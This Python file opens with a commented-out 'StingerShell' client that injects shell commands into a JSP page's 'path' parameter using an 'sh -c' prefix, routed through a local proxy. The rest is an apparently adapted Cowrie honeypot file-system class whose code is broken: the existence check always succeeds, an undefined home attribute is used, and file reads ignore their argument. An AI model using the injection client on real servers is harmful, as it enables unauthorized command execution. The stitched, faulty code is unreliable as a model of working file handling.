# import requests
# import pdb
#
# class StingerShell():
#
#     def __init__(self, addr='http://172.16.180:8080/test.jsp'):
#         self.s = requests.Session()
#         self.proxies = {'http':'127.0.0.1:8080'}
#         self.url = addr
#
#     def run_command(self, cmd):
#         prepend = 'sh -c $@sh . echo'
#         params = {'path': prepend + cmd}
#         results = self.s.get(self.url, params=params, proxies=self.proxies)
#         return results.text

from __future__ import annotations

import os
from os.path import exists
from typing import Any, Optional
import pickle


(
    A_NAME,
    A_TYPE,
    A_UID,
    A_GID,
    A_SIZE,
    A_MODE,
    A_CTIME,
    A_CONTENTS,
    A_TARGET,
    A_REALFILE,
) = list(range(0, 10))
T_LINK, T_DIR, T_FILE, T_BLK, T_CHR, T_SOCK, T_FIFO = list(range(0, 7))


class Test:


    def __init__(self):
        self.fs = None

    def getfile(self, path: str, follow_symlinks: bool = True) -> Optional[list[Any]]:
        """
        This returns the Cowrie file system object for a path
        """

        if path == "/":
            return self.fs
        pieces: list[str] = path.strip("/").split("/")
        cwd: str = ""
        p: Optional[list[Any]] = self.fs
        for piece in pieces:
            if not isinstance(p, list):
                return None
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return None
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and not follow_symlinks:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == "/":
                            # Absolute link
                            fileobj = self.getfile(
                                x[A_TARGET], follow_symlinks=follow_symlinks
                            )
                        else:
                            # Relative link
                            fileobj = self.getfile(
                                "".join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks,
                            )
                        if not fileobj:
                            # Broken link
                            return None
                        p = fileobj
                    else:
                        p = x
            # cwd = '/'.join((cwd, piece))
        return p

    def existing(self, path: str) -> bool:
        """
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """
        print(path)
        f = exists(path)
        # f: Optional[list[Any]] = self.getfile(path, follow_symlinks=True)
        if f is not None:
            return True
        return False

    def resolve_path(self, pathspec: str, cwd: str) -> str:
        """
        This function does not need to be in this class, it has no dependencies
        """
        cwdpieces: list[str] = []

        # If a path within home directory is specified, convert it to an absolute path
        if pathspec.startswith("~/"):
            path = self.home + pathspec[1:]
        else:
            path = pathspec

        pieces = path.rstrip("/").split("/")

        if path[0] == "/":
            cwdpieces = []
        else:
            cwdpieces = [x for x in cwd.split("/") if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == "..":
                if len(cwdpieces):
                    cwdpieces.pop()
                continue
            if piece in (".", ""):
                continue
            cwdpieces.append(piece)

        return "/{}".format("/".join(cwdpieces))

    def file_contents(self, target: str) -> bytes:
        """
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        Then return the executable header for executables
        """
        path: str = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.existing(path.replace('/','')):
            print('not found')
        f: Any = self.getfile('motd')
        content = open('motd', "rb").read().decode('UTF-8')
        return content

    def displayMOTD(self):
        try:
            return self.file_contents("motd")
        except Exception as e:
            print(str(e))
            pass

